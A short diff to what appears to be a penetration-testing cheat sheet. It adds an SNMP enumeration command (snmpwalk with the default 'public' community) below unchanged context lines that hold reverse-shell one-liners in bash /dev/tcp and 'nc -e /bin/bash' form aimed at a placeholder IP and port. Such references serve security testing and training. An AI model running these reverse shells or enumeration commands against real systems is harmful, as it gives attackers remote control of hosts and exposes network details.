@@ -78,6 +78,11 @@ bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
 
 nc -e /bin/bash <IP> <PORT>
 ```
+## services
+```bash
+SNMP
+- snmpwalk -v1 -c public <IP> 
+```
 
 ## etc
 ```bash
